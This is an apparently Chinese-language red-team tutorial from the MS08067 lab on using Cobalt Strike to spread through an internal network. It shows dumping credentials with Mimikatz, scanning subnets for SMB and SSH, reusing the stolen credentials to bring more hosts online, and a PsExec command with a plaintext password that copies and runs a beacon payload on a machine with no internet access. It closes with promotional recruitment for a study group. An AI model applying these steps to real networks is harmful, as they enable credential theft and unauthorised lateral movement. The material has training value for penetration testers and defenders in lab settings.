> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/XfURtykYIcdxHuAmBybZLw)

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5W2M4yKUrsjLd6cLH9AicVTASDgPy2Z7A08wEzkE0nDuN0OLG33MeibXA/640?wx_fmt=png)

点击上方蓝字关注我哦

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5J9ZibHWTNsxNJ7s45bNHEoTUIJhc0ywUMZjbRy13fmbvqrDuL3Z70ug/640?wx_fmt=png)

  

****出品｜MS08067 实验室****

> 本文作者：**BlackCat**（Ms08067 内网安全小组成员）

BlackCat 微信（欢迎骚扰交流）：

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5axwAskE0hw31ju4wfmTGXvEPfPrDWkMDBT7hDUY52pwY000rRwz3rQ/640?wx_fmt=jpeg)  

**前言：**

当获取一台目标服务器权限时，更多是想办法扩大战果，获取目标凭据并横向进行登陆是最快速的拿权方式。但目标所处环境是否可出网，如何利用 CobalStrike 进行批量上线？

**一、获取凭证：**

目标机器 CobalSt rike 上线后，通常先抓取该主机凭据，选择执行 Access->Run Mimikatz，或在 Beacon 中执行 logonpasswords 命令。需要当前会话为管理员权限，才能成功，如果权限低，先提权~

下面的是执行 logonpasswords

图形中是这个。

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5icQsofciaBzHOeTt3Lp5iaTNCnlicSLdhlXFCxsFYibia1VBjP2UWVPSAYuQ/640?wx_fmt=jpeg)

  

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5lR6ycRHxfwePFFLiaICuWQYsyqwzjOwqqZrMFMXtoJmKT6FhW9ibeW8A/640?wx_fmt=jpeg)

  

  

然后查看凭证，Gredentials

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5u6VPfFcLlCico4at8Ky2A1a1yAmI3R4KuUdVkyQzgXU2f3eAPicuDO4Q/640?wx_fmt=jpeg)

  

  

但是不是每次都能抓取到明文

**二、目标机出网:**

获取凭据后，需要对目标网段进行端口存活探测，缩小范围。探测方式比较多，本文仅依托 CobalSt rike 本身完成，不借助其他工具。因为是 psexec 传递登录，这里仅需探测 445 端口。（ psexec : 在主机上使 用服务派生会话）

使用 portscan 命令：ip 网段—ports 端口 一扫描协议（arp、icmp、none） 一线程（实战不要过高）。

这里我环境开了一台 03 的虚拟机，地址是 192.168.19.134 看能搜集到探测她的 445 端口

beacon> portscan 192.168.19.0/24 445 arp 200

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5609eXW5jGavZN0fW2ibfKneH2fc0h4NWazvelpEcYSD2ZicsJGhJkPZw/640?wx_fmt=jpeg)

  

  

点击工具栏的 V iew->Ta rgets，查看端口探测后的存活主机。

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5HBQ8bFTrQaMDL4xicjQUsGCyEdjuro5CXIE9L78jUNCqkSjz6Gk0LJw/640?wx_fmt=jpeg)

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5obmINsw8iaXFqPbuibrAhKXMd8K0bWU8SR23EqsWWtCpnAez112jVbiaA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5H1r1KtL2JKqpDKVS3DrJGKDY03Y4HdibPr2Bp2hC2GeibrxGc2q8nKFQ/640?wx_fmt=jpeg)

  

  

然后右键，用之前收集到的凭证去试其他存活主机。如果在一个域中，所有主机的用户名和密码应该都 是一致的。

右键机器:

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5eQ9ia7bG8LsxcouUhzjia9cQWEyqBrGAc5TrtNyyl8WScgcDcBT1v1tg/640?wx_fmt=jpeg)

  

  

然后选择之前的获取的账号和密码，明文密文都可以，session 选择之前的控机。

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5P65l6f0bMzo8jo4OMekw3ebiae0sypIcfR575VC8kbpBibcYrZnUcAVw/640?wx_fmt=jpeg)

  

  

然后在 beacon 中就可以看到执行的命令。并且这台 03 的机器就会成功的上线

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5ZK9lKsDXaicnUpdKX4eZaJtOp6BUQytQLbdGC7vcuURiccSNj5jxj7Ew/640?wx_fmt=jpeg)

  

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt59ibIvaAbDJcqGt7SWhEaZphib3lHicNDmyLfN2nMfa1a1Hn3tuEwvAKVQ/640?wx_fmt=jpeg)

  

  

**三、目标机不出网**

实战中经常会遇到这种情况，获取到目标内网中某台主机的系统权限，但是该主机处在隔离网络中，不能出网。又因为 CobalStrike 服务端是搭建在互联网中的，通过常规方式是无法上线的，这里就需要利用已上线的主机，将它做一个 Listener, 实现链路上线 CobalStrike。

注：此实验只能在 4.0 版本以下进行

环境模拟：

主机 08 服务器：192.168.203.128/24 #不出网

边界服务器：win7 双网卡：192.168.19.132、192.168.203.129

vps：X.X.X.X

win7 和 08 服务器能互相访问，但是 vps 访问不了 08 已有权限 win7, 试验目的，想要 08 系统在 CS 端上线，这里借鉴一下网上的方法，利用 PxExec 来把生成的后门传到不出网机器上，

首先把他们两个放到一个目录下

那么如何放进去呢？CS 自带一个文件浏览器，只不过速度有些慢，可以的话尽量用 webshell 工具，直接上刀上剑放蝎子。。

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5BpicQ4BoFu2aYMZ6axRTDOt4ySCvuhrpyMib1ibeOE8h2s6gZicVU9xeOQ/640?wx_fmt=jpeg)

  

  

这里是放到已控机器的同一目录。

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5kGDyA0ABtnFTvSicACAyhQU91LKjwPEPI6eeXJibPf1alFgeJDIZfuwA/640?wx_fmt=jpeg)

  

  

然后执行命令:

beacon> shellC:\Windows\Temp\PsExec64.exe-accepteula \\192.168.203.129,192.168.203.128 -uadministrator-pasdqwe123. -d-cC:\Windows\Temp\beacon65.exe

等待上线即可、、

个人觉得这个方法太过麻烦，如果这里用 l cx,ew 等代理攻击进行的话，会更加的省时省力~

**四、Linux 主机 - SSH 批量上线**

第一步还是探测存活主机，然后利用已控的机器进行操作上线。

环境：

CentOS: 192.168.19.139

win7:192.168.19.132

vps :x.x.x.x

通过扫描发现机器：

beacon> portscan 192.168.19.100-150 22 arp 200

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5f8z8447t07NwKHsCHlZ9FnXdeIBn2d6xr33FZCxqhCxbwxy6WOkuRg/640?wx_fmt=jpeg)

  

  

然后观看存活主机

然后

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5qibdxpAiczEsnj7vcrLAmgH6dX0xZNrhRyLCMk4AGmzLiaGjEDYr0icXlQ/640?wx_fmt=jpeg)

  

  

建议用 ssh-key

密码建议用其他方式去获取，这里爆破的话效率不高输入对的账号密码后

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5KwgZWfTXo7t1YYTwsyp88jAT4WExicD4J4Y7beTEOUJGOfMxaLf9UoQ/640?wx_fmt=jpeg)

  

  

然后正常等待上线即可

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5EPam1eTKUsoYOhNDghGmoicz2VP4IQpWS2ibLr8cTXpzAWypgOMCqoGA/640?wx_fmt=jpeg)

  

  

成功上线

本文参考：

https://payloads.cn/2020/0105/how-to-penetrate-the-int ranet-in-actual-combat.html

内网小组持续招人，扫描二维码加入我们！

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cRey7icGjpsvppvqqhcYo6RXAqJcUwZy3EfeNOkMRS37m0r44MWYIYmg/640?wx_fmt=png)

**扫描下方二维码加入星球学习**

**加入后会邀请你进入内部微信群，内部微信群永久有效！**

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cniaUZzJeYAibE3v2VnNlhyC6fSTgtW94Pz51p0TSUl3AtZw0L1bDaAKw/640?wx_fmt=png) ![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cT2rJYbRzsO9Q3J9rSltBVzts0O7USfFR8iaFOBwKdibX3hZiadoLRJIibA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicBVC2S4ujJibsVHZ8Us607qBMpNj25fCmz9hP5T1yA6cjibXXCOibibSwQmeIebKa74v6MXUgNNuia7Uw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cRey7icGjpsvppvqqhcYo6RXAqJcUwZy3EfeNOkMRS37m0r44MWYIYmg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicjovru6mibAFRpVqK7ApHAwiaEGVqXtvB1YQahibp6eTIiaiap2SZPer1QXsKbNUNbnRbiaR4djJibmXAfQ/640?wx_fmt=jpeg) ![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicJ39cBtzvcja8GibNMw6y6Amq7es7u8A8UcVds7Mpib8Tzu753K7IZ1WdZ66fDianO2evbG0lEAlJkg/640?wx_fmt=png)  

**目前 35000 + 人已关注加入我们**

![](https://mmbiz.qpic.cn/mmbiz_gif/XWPpvP3nWa9FwrfJTzPRIyROZ2xwWyk6xuUY59uvYPCLokCc6iarKrkOWlEibeRI9DpFmlyNqA2OEuQhyaeYXzrw/640?wx_fmt=gif)